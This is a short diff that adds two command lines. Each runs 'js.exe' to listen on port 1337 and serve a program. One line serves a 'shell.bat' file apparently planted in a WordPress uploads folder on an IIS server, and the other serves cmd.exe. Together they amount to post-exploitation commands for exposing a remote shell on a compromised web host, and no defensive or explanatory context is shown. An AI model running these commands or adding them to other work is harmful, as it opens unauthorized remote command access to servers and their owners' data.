@@ -1,0 +1,2 @@
+js.exe -t * -p C:\inetpub\wwwroot\wordpress\wp-content\uploads\shell.bat -l 1337
+js.exe -l 1337 -p c:\windows\system32\cmd.exe -t *
